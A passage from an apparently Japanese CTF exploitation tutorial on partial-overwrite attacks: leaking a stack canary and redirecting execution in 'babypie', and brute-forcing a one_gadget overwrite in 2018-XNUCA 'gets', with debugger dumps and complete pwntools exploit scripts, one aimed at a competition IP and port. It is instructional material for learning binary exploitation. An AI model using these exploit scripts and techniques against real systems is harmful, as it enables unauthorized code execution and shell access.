LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7f1898a64690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x30
 RDI  0x557c8443ab15 ◂— insb   byte ptr [rdi], dx /* 'Hello %s:\n' */
 RSI  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7f1898f1d700 ◂— 0x7f1898f1d700
 R9   0x7f1898f1d700 ◂— 0x7f1898f1d700
 R10  0x37b
 R11  0x246
 R12  0x557c8443a830 ◂— xor    ebp, ebp
 R13  0x7ffd97aa0540 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
 RSP  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
 RIP  0x557c8443aa08 ◂— call   0x557c8443a7e0
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
 ► 0x557c8443aa08    call   0x557c8443a7e0

   0x557c8443aa0d    lea    rax, [rbp - 0x30]
   0x557c8443aa11    mov    edx, 0x60
   0x557c8443aa16    mov    rsi, rax
   0x557c8443aa19    mov    edi, 0
   0x557c8443aa1e    call   0x557c8443a7f0

   0x557c8443aa23    mov    eax, 0
   0x557c8443aa28    mov    rcx, qword ptr [rbp - 8]
   0x557c8443aa2c    xor    rcx, qword ptr fs:[0x28]
   0x557c8443aa35    je     0x557c8443aa3c

   0x557c8443aa37    call   0x557c8443a7c0
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsi rsp  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
05:0028│          0x7ffd97aa0438 ◂— 0xb3012605fc402a61
06:0030│ rbp      0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
07:0038│          0x7ffd97aa0448 —▸ 0x557c8443aa6a ◂— mov    eax, 0
Breakpoint *(0x557c8443a000+0xA08)
pwndbg> canary
$1 = 0
canary : 0xb3012605fc402a00
pwndbg>
```

canary は rbp - 0x8 の位置にあり、このとき canary の最下位バイトがすでに 0x61 に上書きされていることが分かります。したがって、'a' * (0x30 - 0x8 + 1) の後の 7 バイトを受信し、最下位バイトの '\0' を加えれば、プログラムの canary を復元できます。

#### 戻りアドレスの上書き
canary を得たら、2回目のスタックオーバーフローで戻りアドレスを書き換えられます。戻りアドレスを getshell 関数に制御するだけです。まず、オーバーフローさせていないときの戻りアドレスを見てみます。

```asm
0x000055dc43694a1e in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 RBX  0x0
 RCX  0x7f206c6696f0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x0
 RSI  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7f206cb22700 ◂— 0x7f206cb22700
 R9   0x3e
 R10  0x73
 R11  0x246
 R12  0x55dc43694830 ◂— xor    ebp, ebp
 R13  0x7fff9aa3b050 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
 RSP  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 RIP  0x55dc43694a1e ◂— call   0x55dc436947f0
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
   0x55dc43694a08    call   0x55dc436947e0
 
   0x55dc43694a0d    lea    rax, [rbp - 0x30]
   0x55dc43694a11    mov    edx, 0x60
   0x55dc43694a16    mov    rsi, rax
   0x55dc43694a19    mov    edi, 0
 ► 0x55dc43694a1e    call   0x55dc436947f0
 
   0x55dc43694a23    mov    eax, 0
   0x55dc43694a28    mov    rcx, qword ptr [rbp - 8]
   0x55dc43694a2c    xor    rcx, qword ptr fs:[0x28]
   0x55dc43694a35    je     0x55dc43694a3c
 
   0x55dc43694a37    call   0x55dc436947c0
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rax rsi rsp  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
05:0028│              0x7fff9aa3af48 ◂— 0xbfe0cfbabccd2861
06:0030│ rbp          0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
07:0038│              0x7fff9aa3af58 —▸ 0x55dc43694a6a ◂— mov    eax, 0
pwndbg> x/10i (0x0A3E+0x55dc43694000) 
   0x55dc43694a3e:	push   rbp
   0x55dc43694a3f:	mov    rbp,rsp
   0x55dc43694a42:	lea    rdi,[rip+0xd7]        # 0x55dc43694b20
   0x55dc43694a49:	call   0x55dc436947d0
   0x55dc43694a4e:	nop
   0x55dc43694a4f:	pop    rbp
   0x55dc43694a50:	ret    
   0x55dc43694a51:	push   rbp
   0x55dc43694a52:	mov    rbp,rsp
   0x55dc43694a55:	sub    rsp,0x10
```
このときの戻りアドレスと get shell 関数のアドレスは、下位の 8 bit しか違わないことが分かります。下位 8 bit を `0x?A3E` に書き換えれば、ある程度の確率で get shell できます。

最終的なスクリプトは次のとおりです。
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

while True:
    try:
        io = process("./babypie", timeout = 1)

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
        io.recvuntil('a' * (0x30 - 0x8 + 1))
        canary = '\0' + io.recvn(7)
        success(canary.encode('hex'))

        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')

        io.interactive()
    except Exception as e:
        io.close()
        print e
```
なお、このテクニックはスタック上だけでなく、ヒープ上でもアドレスのランダム化を回避する有効な手段です。

### 2018-XNUCA-gets

この問題もなかなか面白いです。次のとおりです。

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v4; // [rsp+0h] [rbp-18h]

  gets((char *)&v4);
  return 0LL;
}
```

プログラムはこれだけの小ささで、明らかにスタックオーバーフローの脆弱性が1つありますが、leak は一切ありません……。

#### 保護の確認

まず、プログラムの保護を見てみます。

```c
[*] '/mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

幸い、プログラムには canary がないため、当然 EIP は簡単に制御できますが、どこに制御するかが問題です。

#### 分析

ELF の基本的な実行の流れ(実行ファイルの部分)から、プログラムの基本的な実行の流れが分かります。同時に、スタック上に2つの関数の戻りアドレスがあることが分かります。

```asm
pwndbg> stack 25
00:0000│ rsp  0x7fffffffe398 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
01:0008│      0x7fffffffe3a0 ◂— 0x1
02:0010│      0x7fffffffe3a8 —▸ 0x7fffffffe478 —▸ 0x7fffffffe6d9 ◂— 0x6667682f746e6d2f ('/mnt/hgf')
03:0018│      0x7fffffffe3b0 ◂— 0x1f7ffcca0
04:0020│      0x7fffffffe3b8 —▸ 0x400420 ◂— sub    rsp, 0x18
05:0028│      0x7fffffffe3c0 ◂— 0x0
06:0030│      0x7fffffffe3c8 ◂— 0xf086047f3fb49558
07:0038│      0x7fffffffe3d0 —▸ 0x400440 ◂— xor    ebp, ebp
08:0040│      0x7fffffffe3d8 —▸ 0x7fffffffe470 ◂— 0x1
09:0048│      0x7fffffffe3e0 ◂— 0x0
... ↓
0b:0058│      0x7fffffffe3f0 ◂— 0xf79fb00f2749558
0c:0060│      0x7fffffffe3f8 ◂— 0xf79ebba9ae49558
0d:0068│      0x7fffffffe400 ◂— 0x0
... ↓
10:0080│      0x7fffffffe418 —▸ 0x7fffffffe488 —▸ 0x7fffffffe704 ◂— 0x504d554a4f545541 ('AUTOJUMP')
11:0088│      0x7fffffffe420 —▸ 0x7ffff7ffe168 ◂— 0x0
12:0090│      0x7fffffffe428 —▸ 0x7ffff7de77cb (_dl_init+139) ◂— jmp    0x7ffff7de77a0
```

このうち `__libc_start_main+240` は libc 内に、`_dl_init+139` は ld 内にあります。

```
0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0
0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
```

自然な考えは、partial overwrite でこの2つのアドレスのどちらかを shell を得られる場所に書き換えることで、それは当然 Onegadget です。では、どちらを上書きすればよいのでしょうか。

まず `libc` のベースアドレス `0x7ffff7a0d000` を分析します。バイトを上書きする場合、onegadget にジャンプするには少なくとも 1.5 バイトを上書きする必要があります。しかしプログラムは `gets` で読み込むため、文字列の末尾には必ず `\x00` が付きます。

また、バイトの上書きは整数バイト単位で行う必要があり、少なくとも 3 バイトを上書きすることになります。`__libc_start_main+240` のアドレス `0x7ffff7a2d830` を見ると、3 バイト上書きすれば `0x7ffff700xxxx` となり、すでに libc のベースアドレスより小さくなってしまい、その手前に意図的に実行できるコードの位置もありません。

一般に libc_start_main の libc 内でのオフセットはそれほど大きく変わらないので、`__libc_start_main+240` を上書きするのは明らかに不可能です。

では ld のベースアドレスはどうでしょうか。スタック上の `_dl_init+139` を上書きすると `0x7ffff700xxxx` になります。上のメモリレイアウトを見ると、`libc` は `ld` よりも低位アドレス側にあるので、ランダム化のとき libc の3バイト目が `\x00` になる可能性が非常に高いです。

例を挙げると、現在の両者の間のオフセットは次のとおりです。

```
0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000
```

そこで ld が `0x7ffff73ca000` にロードされたなら、`libc` の開始アドレスは当然 `0x7ffff7000000` です。

したがって、スタックに格納された `_dl_init+139` を上書きすることを選ぶ十分な理由があります。では何に書き換えるのでしょうか。まだ分かりません。libc のバージョンがまだ分からないからです……

まず適当に上書きして、プログラムがクラッシュするかを見てみます。この時点では libc ライブラリのコードが実行される可能性が高いからです。

```python
from pwn import *
context.terminal = ['tmux', 'split', '-h']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elfpath = './gets'
context.binary = elfpath

elf = ELF(elfpath)
bits = elf.bits


def exp(ip, port):
    for i in range(0x1000):
        if args['REMOTE']:
            p = remote(ip, port)
        else:
            p = process(elfpath, timeout=2)
        # gdb.attach(p)
        try:
            payload = 0x18 * 'a' + p64(0x40059B)
            for _ in range(2):
                payload += 'a' * 8 * 5 + p64(0x40059B)
            payload += 'a' * 8 * 5 + p16(i)
            p.sendline(payload)
            data = p.recv()
            print data
            p.interactive()
            p.close()
        except Exception:
            p.close()
            continue


if __name__ == "__main__":
    exp('106.75.4.189', 35273)
```

最終的に次のようなエラーが出ました。一方では、これが 2.23 バージョンの libc であると判断できます。もう一方では、`(cfree+0x4c)[0x7f57b6f9253c]` から libc のバージョンを最終的に特定できます。

```
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c]
/lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40]
[0x7ffdec480f20]
======= Memory map: ========
00400000-00401000 r-xp 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00600000-00601000 r--p 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00601000-00602000 rw-p 00001000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00b21000-00b43000 rw-p 00000000 00:00 0                                  [heap]
7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0
7f57b0021000-7f57b4000000 ---p 00000000 00:00 0
7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0
7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0
7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0
7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0
7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0                          [stack]
7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0                          [vvar]
7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

libc のバージョンを確定したら、one_gadget を選べます。ここでは最初の、より低いアドレスのものを選びます。

```shell
➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```

次の exp でブルートフォースを続けます。

```python
from pwn import *
context.terminal = ['tmux', 'split', '-h']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elfpath = './gets'
context.binary = elfpath

elf = ELF(elfpath)
bits = elf.bits


def exp(ip, port):
    for i in range(0x1000):
        if args['REMOTE']:
            p = remote(ip, port)
        else:
            p = process(elfpath, timeout=2)
        # gdb.attach(p)
        try:
            payload = 0x18 * 'a' + p64(0x40059B)
            for _ in range(2):
                payload += 'a' * 8 * 5 + p64(0x40059B)
            payload += 'a' * 8 * 5 + '\x16\02'
            p.sendline(payload)

            p.sendline('ls')
            data = p.recv()
            print data
            p.interactive()
            p.close()
        except Exception:
            p.close()
            continue


if __name__ == "__main__":
    exp('106.75.4.189', 35273)
```

最終的に shell を得られました。

```python
$ ls
exp.py  gets
```

### 問題
